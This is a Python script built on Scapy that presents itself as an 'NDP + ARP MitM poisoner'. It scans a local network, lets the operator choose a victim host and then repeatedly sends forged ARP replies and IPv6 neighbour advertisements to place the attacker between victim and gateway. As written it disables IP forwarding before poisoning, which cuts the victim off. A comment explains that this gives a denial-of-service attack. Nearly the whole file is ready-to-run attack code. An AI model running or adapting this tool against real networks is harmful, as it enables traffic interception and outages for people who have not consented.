from scapy.all import *
import time, sys, subprocess, re, argparse

# ── Attacker ──────────────────────────────────────────────────────────────────

def get_attacker_info(interface: str) -> tuple[str, str, str]:
    mac = get_if_hwaddr(interface)

    # IPv6 link-local
    result = subprocess.run(['ip', '-6', 'addr', 'show', interface],
                            capture_output=True, text=True)
    ipv6_matches = re.findall(r'inet6 (fe80:[:\da-f]+)/\d+', result.stdout)
    ipv6 = ipv6_matches[0] if ipv6_matches else "N/A"

    # IPv4
    result4 = subprocess.run(['ip', '-4', 'addr', 'show', interface],
                             capture_output=True, text=True)
    ipv4_matches = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result4.stdout)
    ipv4 = ipv4_matches[0] if ipv4_matches else "N/A"

    return mac, ipv4, ipv6

# ── IPv4 scan & target selection ──────────────────────────────────────────────

def scan_ipv4(network: str) -> list[dict]:
    print(f"\n[*] Scanning {network} …")
    broadcast        = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req          = ARP(pdst=network)
    answered, _      = srp(broadcast / arp_req, timeout=2, verbose=False)

    clients = []
    for _, rx in answered:
        clients.append({"ip": rx.psrc, "mac": rx.hwsrc})

    if not clients:
        print("[!] No IPv4 hosts found on that network.")
        sys.exit(0)

    print(f"\n{'─'*60}")
    print(f"  {'#':<5} {'IPv4':<18} {'MAC'}")
    print(f"{'─'*60}")
    for i, c in enumerate(clients, 1):
        print(f"  [{i}]   {c['ip']:<18} {c['mac']}")
    print(f"{'─'*60}")

    return clients


def pick_ipv4_target(clients: list[dict]) -> dict:
    while True:
        try:
            choice = int(input("Select IPv4 target index: "))
            if 1 <= choice <= len(clients):
                return clients[choice - 1]
        except ValueError:
            pass
        print(f"  Enter a number between 1 and {len(clients)}.")

# ── IPv6 discovery & target selection ────────────────────────────────────────

def discover_ipv6_peers(attacker_mac: str, timeout: int = 30) -> list[dict]:
    seen:  set[str]   = set()
    peers: list[dict] = []

    def _process(packet):
        if IPv6 not in packet or Ether not in packet:
            return
        src_ip  = packet[IPv6].src.split("%")[0]
        src_mac = packet[Ether].src
        if src_ip.startswith("fe80") and src_ip not in seen and src_mac != attacker_mac:
            seen.add(src_ip)
            peers.append({"ip": src_ip, "mac": src_mac})
            print(f"  [{len(peers)}] {src_ip}  —  {src_mac}")

    print(f"\n{'─'*60}")
    print(f"  Sniffing for IPv6 link-local peers ({timeout}s) …  Ctrl+C to stop early")
    print(f"{'─'*60}")
    try:
        sniff(prn=_process, store=False, timeout=timeout)
    except KeyboardInterrupt:
        pass

    if not peers:
        print("[!] No IPv6 peers discovered.")
        sys.exit(0)

    return peers


def pick_ipv6_target(peers: list[dict]) -> dict:
    print(f"\n{'─'*60}")
    print(f"  {'#':<5} {'IPv6':<42} {'MAC'}")
    print(f"{'─'*60}")
    for i, p in enumerate(peers, 1):
        print(f"  [{i}]   {p['ip']:<42} {p['mac']}")
    print(f"{'─'*60}")

    while True:
        try:
            choice = int(input("Select IPv6 target index: "))
            if 1 <= choice <= len(peers):
                return peers[choice - 1]
        except ValueError:
            pass
        print(f"  Enter a number between 1 and {len(peers)}.")

# ── Gateway resolution ────────────────────────────────────────────────────────

def get_gateway_ipv4(interface: str) -> str:
    result = subprocess.run(['ip', 'route', 'show', 'dev', interface],
                            capture_output=True, text=True)
    match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
    if match:
        return match.group(1)
    # fallback: parse from global route table
    result2 = subprocess.run(['ip', 'route'], capture_output=True, text=True)
    match2  = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result2.stdout)
    return match2.group(1) if match2 else "N/A"


def get_gateway_ipv6(interface: str) -> str:
    result = subprocess.run(['ip', '-6', 'route', 'show', 'dev', interface],
                            capture_output=True, text=True)
    match = re.search(r'default via (fe80:[:\da-f]+)', result.stdout)
    return match.group(1) if match else "N/A"


def get_mac_from_neigh(ip: str) -> str:
    """Look up a MAC from the kernel neighbour table, pinging first if needed."""
    for _ in range(2):
        result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True)
        match  = re.search(rf'{re.escape(ip)}\s+.+lladdr\s+([0-9a-f:]+)', result.stdout)
        if match:
            return match.group(1)
        # not in cache yet — send a ping to trigger NDP/ARP
        cmd = ['ping6', '-c', '1', '-W', '1', ip] if ':' in ip else \
              ['ping',  '-c', '1', '-W', '1', ip]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return "N/A"

# ── Forwarding ────────────────────────────────────────────────────────────────

def set_forwarding(state: bool) -> None:
    val = "1" if state else "0"
    subprocess.run(['sysctl', '-w', f'net.ipv4.ip_forward={val}'],
                   stdout=subprocess.DEVNULL, check=True)
    subprocess.run(['sysctl', '-w', f'net.ipv6.conf.all.forwarding={val}'],
                   stdout=subprocess.DEVNULL, check=True)

# ── Poisoning ─────────────────────────────────────────────────────────────────

def poison_ndp(attacker_mac: str, target: dict, gateway: dict) -> None:
    # Tell TARGET: gateway_ip → attacker_mac
    sendp(Ether(src=attacker_mac,  dst=target["mac"])   /
          IPv6( src=gateway["ip6"], dst=target["ip6"])     /
          ICMPv6ND_NA(tgt=gateway["ip6"], R=1, S=0, O=1) /
          ICMPv6NDOptDstLLAddr(lladdr=attacker_mac),
          verbose=False)

    # Tell GATEWAY: target_ip → attacker_mac
    sendp(Ether(src=attacker_mac, dst=gateway["mac"])   /
          IPv6( src=target["ip6"], dst="ff02::1")         /
          ICMPv6ND_NA(tgt=target["ip6"], R=0, S=0, O=1)  /
          ICMPv6NDOptDstLLAddr(lladdr=attacker_mac),
          verbose=False)


def poison_arp(attacker_mac: str, target: dict, gateway: dict, interface: str) -> None:
    # Tell TARGET: gateway_ip → attacker_mac
    sendp(Ether(dst=target["mac"]) /
          ARP(op=2, pdst=target["ip"],  hwdst=target["mac"],
                    psrc=gateway["ip"], hwsrc=attacker_mac),
          verbose=False, iface=interface)

    # Tell GATEWAY: target_ip → attacker_mac
    sendp(Ether(dst=gateway["mac"]) /
          ARP(op=2, pdst=gateway["ip"], hwdst=gateway["mac"],
                    psrc=target["ip"],  hwsrc=attacker_mac),
          verbose=False, iface=interface)


def restore(target: dict, gateway: dict) -> None:
    print("\n[*] Restoring caches …")

    # Restore NDP
    sendp(Ether(src=gateway["mac"],  dst=target["mac"])    /
          IPv6( src=gateway["ip6"],  dst=target["ip6"])    /
          ICMPv6ND_NA(tgt=gateway["ip6"], R=1, S=0, O=1)  /
          ICMPv6NDOptDstLLAddr(lladdr=gateway["mac"]),
          count=3, verbose=False)

    sendp(Ether(src=target["mac"],  dst=gateway["mac"])   /
          IPv6( src=target["ip6"],  dst="ff02::1")         /
          ICMPv6ND_NA(tgt=target["ip6"], R=0, S=0, O=1)   /
          ICMPv6NDOptDstLLAddr(lladdr=target["mac"]),
          count=3, verbose=False)

    # Restore ARP
    sendp(Ether(dst=target["mac"]) /
          ARP(op=2, pdst=target["ip"],  hwdst=target["mac"],
                    psrc=gateway["ip"], hwsrc=gateway["mac"]),
          count=3, verbose=False)

    sendp(Ether(dst=gateway["mac"]) /
          ARP(op=2, pdst=gateway["ip"], hwdst=gateway["mac"],
                    psrc=target["ip"],  hwsrc=target["mac"]),
          count=3, verbose=False)

    set_forwarding(False)
    print("[*] Restored.")

# ── Summary banner ────────────────────────────────────────────────────────────

def print_summary(attacker: dict, target: dict, gateway: dict) -> None:
    W = 60
    def row(label, ipv4, ipv6, mac):
        print(f"  {label:<10} IPv4: {ipv4:<18}  MAC: {mac}")
        print(f"  {'':<10} IPv6: {ipv6}")
        print(f"  {'─'*56}")

    print(f"\n{'═'*W}")
    print(f"  {'SESSION SUMMARY':^56}")
    print(f"{'═'*W}")
    row("Attacker", attacker["ip"],  attacker["ip6"], attacker["mac"])
    row("Target",   target["ip"],    target["ip6"],   target["mac"])
    row("Gateway",  gateway["ip"],   gateway["ip6"],  gateway["mac"])
    print(f"{'═'*W}\n")

# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print("""
          
          
 __   __  __   __        _______  ___      __   __  _______  ______   _______  __    _  ___  
|  |_|  ||  | |  |      |       ||   |    |  |_|  ||   _   ||      | |   _   ||  |  | ||   | 
|       ||  |_|  |      |    ___||   |    |       ||  |_|  ||  _    ||  |_|  ||   |_| ||   | 
|       ||       |      |   |___ |   |    |       ||       || | |   ||       ||       ||   | 
|       ||       | ___  |    ___||   |___ |       ||       || |_|   ||       ||  _    ||   | 
| ||_|| ||   _   ||   | |   |___ |       || ||_|| ||   _   ||       ||   _   || | |   ||   | 
|_|   |_||__| |__||___| |_______||_______||_|   |_||__| |__||______| |__| |__||_|  |__||___|                                                                                      
                                                                
""")
    parser = argparse.ArgumentParser(
        description="NDP + ARP MitM poisoner"
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="Network interface  (e.g. eth0)")
    parser.add_argument("-n", "--network",   required=True,
                        help="IPv4 CIDR pool    (e.g. 192.168.1.0/24)")
    args = parser.parse_args()

    # ── Attacker info
    attacker_mac, attacker_ip4, attacker_ip6 = get_attacker_info(args.interface)
    attacker = {"mac": attacker_mac, "ip": attacker_ip4, "ip6": attacker_ip6}

    # ── IPv4 scan → pick target
    ipv4_clients   = scan_ipv4(args.network)
    chosen_v4      = pick_ipv4_target(ipv4_clients)

    # ── IPv6 discovery → pick target (match same host by MAC)
    ipv6_peers     = discover_ipv6_peers(attacker_mac, timeout=30)
    chosen_v6      = pick_ipv6_target(ipv6_peers)

    # ── Merge into one target dict (user picks the same device on both prompts)
    target = {
        "mac": chosen_v4["mac"],
        "ip":  chosen_v4["ip"],
        "ip6": chosen_v6["ip"],
    }

    # ── Gateway info
    gw_ip4  = get_gateway_ipv4(args.interface)
    gw_ip6  = get_gateway_ipv6(args.interface)
    gw_mac  = get_mac_from_neigh(gw_ip4)
    gateway = {"mac": gw_mac, "ip": gw_ip4, "ip6": gw_ip6}

    # ── Summary
    print_summary(attacker, target, gateway)

    # ── Confirmation prompt
    confirm = input("Start poisoning? [y/N]: ").strip().lower()
    if confirm != "y":
        print("[*] Aborted.")
        sys.exit(0)
    # if you want run DOS attack pass false otherwise you will run MitM attack
    set_forwarding(False)

    print(f"\n{'─'*60}")
    print("  Poisoning …  Ctrl+C to stop")
    print(f"{'─'*60}\n")

    try:
        while True:
            poison_ndp(attacker_mac, target, gateway)
            poison_arp(attacker_mac, target, gateway, args.interface)
            print("!", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        restore(target, gateway)


if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print("[!] Run as root.")
        sys.exit(1)